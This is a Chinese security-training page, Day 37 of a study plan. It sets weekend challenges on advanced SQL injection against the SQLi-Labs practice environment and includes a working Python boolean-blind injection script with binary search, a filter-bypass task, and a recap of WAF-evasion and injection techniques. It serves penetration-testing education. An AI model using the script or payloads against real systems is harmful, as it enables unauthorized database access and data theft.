---
title: Day037：Week 6 周末闯关 - SQL 注入进阶总结
tags:
  - 网络安全
  - SQL注入
  - 周末挑战
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d037
date: 2026-02-28
updated: 2026-01-28
---

# Day037：Week 6 周末闯关 - SQL 注入进阶总结

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 6：SQL 注入进阶 |
| **今日主题** | 周末挑战与知识总结 |
| **预计时间** | 3-4 小时 |
| **难度等级** | 综合挑战 |

---

## 今日痛点场景

> **场景**：这一周你学了 SQL 注入的各种高级技巧。现在是检验成果的时候了。
>
> **问题**：能不能独立完成一次完整的 SQL 注入渗透？
>
> **今天的任务**：综合运用本周所学，完成挑战并输出总结。

---

## 今日目标

- [ ] 完成综合挑战任务
- [ ] 回顾本周知识点
- [ ] 输出 Week 6 学习总结
- [ ] 为 Week 7 做准备

**闯关条件**：完成所有挑战任务。

---

## 综合挑战任务

### 挑战 1：黑盒测试（60 分钟）

**任务**：在不查看源代码的情况下，完成 SQLi-Labs Less-17

**要求**：
1. 找到注入点
2. 判断注入类型
3. 获取数据库名
4. 获取 users 表的用户名和密码

**记录**：
```
注入点位置：________________
注入类型：________________
使用的 Payload：________________
获取的数据：________________
```

---

### 挑战 2：WAF 绕过（45 分钟）

**任务**：绕过以下过滤规则完成注入

**过滤规则**：
```php
$id = str_replace(array('select', 'union', 'and', 'or', ' '), '', strtolower($_GET['id']));
```

**要求**：
1. 分析过滤逻辑
2. 构造绕过 Payload
3. 成功获取数据

**记录**：
```
过滤分析：________________
绕过方法：________________
成功的 Payload：________________
```

---

### 挑战 3：自动化脚本（45 分钟）

**任务**：编写 Python 脚本完成布尔盲注

**要求**：
1. 实现二分法优化
2. 自动获取数据库名
3. 记录请求次数和耗时

**脚本模板**：

```python
import requests
import time

# 配置
url = "http://target/sqli-labs/Less-8/"
start_time = time.time()
request_count = 0

def check(payload):
    global request_count
    request_count += 1
    params = {"id": payload}
    r = requests.get(url, params=params)
    return "You are in" in r.text

def get_database_name():
    db_name = ""
    for i in range(1, 20):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            payload = f"1' and ascii(substr(database(),{i},1))>{mid}-- "
            if check(payload):
                low = mid + 1
            else:
                high = mid
        if low == 32:
            break
        db_name += chr(low)
        print(f"[+] 进度: {db_name}")
    return db_name

if __name__ == "__main__":
    print("[*] 开始布尔盲注...")
    db = get_database_name()
    elapsed = time.time() - start_time
    print(f"[+] 数据库名: {db}")
    print(f"[+] 请求次数: {request_count}")
    print(f"[+] 耗时: {elapsed:.2f} 秒")
```

**记录**：
```
脚本运行结果：________________
请求次数：________________
耗时：________________秒
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 完成黑盒测试挑战 | 30 分 |
| 完成 WAF 绕过挑战 | 25 分 |
| 完成自动化脚本 | 25 分 |
| 输出知识总结 | 20 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## Week 6 知识总结

### 本周学习内容

| 日期 | 主题 | 核心技能 |
|------|------|----------|
| Day 31 | 布尔盲注 | length(), substr(), ascii(), 二分法 |
| Day 32 | 时间盲注 | sleep(), if(), benchmark() |
| Day 33 | 报错注入 | extractvalue(), updatexml() |
| Day 34 | WAF 绕过 | 大小写、编码、注释、空格替换 |
| Day 35 | 二次注入/宽字节 | 数据流分析、%df 逃逸 |
| Day 36 | 综合练习 | SQLi-Labs 实战 |
| Day 37 | 周末挑战 | 综合运用 |

### 技能树更新

```
SQL 注入
├── 基础注入（Week 3）
│   ├── 判断注入点
│   ├── Union 注入
│   └── 信息获取流程
└── 进阶注入（Week 6）
    ├── 盲注技术
    │   ├── 布尔盲注
    │   └── 时间盲注
    ├── 报错注入
    ├── WAF 绕过
    │   ├── 编码绕过
    │   ├── 注释绕过
    │   └── 空格绕过
    └── 特殊注入
        ├── 二次注入
        └── 宽字节注入
```

### 面试高频问题

**Q1：介绍一下 SQL 注入的类型？**

A1：
1. **有回显注入**：Union 注入、报错注入
2. **盲注**：布尔盲注、时间盲注
3. **特殊类型**：二次注入、宽字节注入、堆叠注入

**Q2：布尔盲注和时间盲注有什么区别？**

A2：
- 布尔盲注：通过页面内容变化判断条件真假
- 时间盲注：通过响应时间判断条件真假
- 时间盲注适用于页面完全无变化的场景

**Q3：如何绕过 WAF？**

A3：
1. 大小写混淆
2. 编码绕过（URL、十六进制、Unicode）
3. 注释干扰
4. 空格替换
5. 参数污染
6. 分块传输

**Q4：什么是二次注入？**

A4：恶意数据在存入时被转义，但从数据库取出后未再次转义，用于新的 SQL 语句时触发注入。

---

## 下周预告

**Week 7：XSS 进阶与 CSRF**

下周你将学习：
- XSS 高级绕过技巧
- DOM XSS 深入
- CSRF 攻击链构造
- BeEF 框架使用

**目标**：掌握 XSS 和 CSRF 的高级利用技巧

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| Week 6 总用时 | |
| 最大收获 | |
| 最大挑战 | |
| 下周期待 | |

---

> **导师点评**：
>
> 恭喜你完成了 Week 6！
>
> SQL 注入，你现在算是"会"了。不是"知道"，是真的"会"。
>
> 布尔盲注、时间盲注、报错注入、WAF 绕过——这些是渗透测试的基本功。
>
> 很多人学了一周就觉得 SQL 注入很简单。但真正的高手，是能在复杂环境下快速判断、灵活组合的人。
>
> 下周开始学 XSS 进阶。从攻击数据库，到攻击用户浏览器。
>
> **记住：攻击面越广，你的价值越大**。

```bash
echo "Week 6 Complete! SQL 注入进阶通关！"
```
